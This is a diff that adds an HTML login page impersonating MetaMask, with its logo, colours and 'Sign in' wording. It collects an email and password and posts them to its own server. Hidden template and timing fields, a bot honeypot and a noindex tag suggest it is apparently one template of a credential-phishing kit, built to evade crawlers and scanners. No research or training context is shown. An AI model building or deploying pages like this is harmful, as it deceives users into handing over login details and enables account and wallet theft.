@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Sign in to MetaMask</title>
+<meta name="theme-color" content="#F6851B">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23F6851B%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EM%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23F6851B%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EM%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="Sign in to MetaMask">
+<meta property="og:site_name" content="MetaMask">
+<style>
+  body { margin:0;min-height:100vh;background:#0b0d12;color:#fff;
+         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
+                     sans-serif;display:flex;align-items:center;justify-content:center;
+         padding:32px 16px; }
+  .card { background:#151922;width:100%;max-width:420px;border-radius:12px;
+          padding:40px 36px;box-sizing:border-box;
+          box-shadow:0 20px 60px rgba(0,0,0,.55);text-align:center; }
+  .mark { display:flex;justify-content:center;margin:0 0 22px; }
+  h1 { font-size:22px;font-weight:600;margin:0 0 8px; }
+  .sub { font-size:14px;color:#9aa7b8;margin:0 0 26px; }
+  .field { text-align:left;margin-bottom:14px; }
+  .field label { display:block;font-size:13px;color:#9aa7b8;margin:0 0 6px; }
+  .field input { width:100%;padding:13px 14px;font-size:15px;color:#fff;
+                 background:#151922;border:1px solid #2a3242;border-radius:8px;
+                 outline:none;box-sizing:border-box; }
+  .field input:focus { border-color:#F6851B; }
+  .btn { width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;
+         background:#F6851B;border:0;border-radius:8px;cursor:pointer;margin-top:8px; }
+  .row { display:flex;justify-content:space-between;align-items:center;margin:16px 0 0;
+         font-size:13px;color:#9aa7b8; }
+  .row a { color:#F6851B;text-decoration:none; }
+  .foot { font-size:12px;color:#7b8698;margin-top:22px;line-height:1.6; }
+  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="mark"><svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="MetaMask"><path fill="#e2761b" d="M21.5 3l-8 6 1.5-3.5zM2.5 3l8 6-1.4-3.5zM18.6 16.4l-2.1 3.2 4.6 1.3 1.3-4.5zM1.6 16.4L2.9 21l4.6-1.3-2.1-3.2z"/><path fill="#e4761b" d="M7.2 10.6l-1.4 2.1 4.9.2-.2-5.3zM16.8 10.6l-3.4-3.1-.1 5.4 4.9-.2zM7.5 19.6l2.9-1.4-2.5-2zM13.6 18.2l2.9 1.4-.4-3.4z"/><path fill="#763d16" d="M16.5 19.6l-2.9-1.4.2 1.9v1.3zM7.5 19.6l2.7 1.8v-1.3l.2-1.9z"/></svg></div>
+  <h1>MetaMask</h1>
+  <p class="sub">Sign in with your email</p>
+  <form method="POST" action="/">
+    <div class="field">
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="username" required>
+    </div>
+    <div class="field">
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
+    </div>
+    <button class="btn" type="submit">Sign in</button>
+    <div class="row"><label style="display:flex;gap:6px;align-items:center"><input type="checkbox" name="remember" value="1" checked> Keep me signed in</label><a href="#">Forgot password?</a></div>
+
+  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
+  <input type="hidden" name="_tpl" value="metamask">
+  <input type="hidden" name="_ts" value="__TS__">
+
+<script>
+/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
+   record it, and we log how long the form was open (bot forms are instant). */
+(function(){
+  var t0 = Date.now();
+  var f = document.querySelector('form');
+  if(!f) return;
+  f.addEventListener('submit', function(){
+    var el = f.querySelector('input[name=_ts]');
+    if(el) el.value = String(Date.now() - t0);
+  });
+})();
+</script>
+    <div class="foot">MetaMask and the MetaMask mark are trademarks of their respective owner.</div>
+  </form>
+</div>
+</body>
+</html>
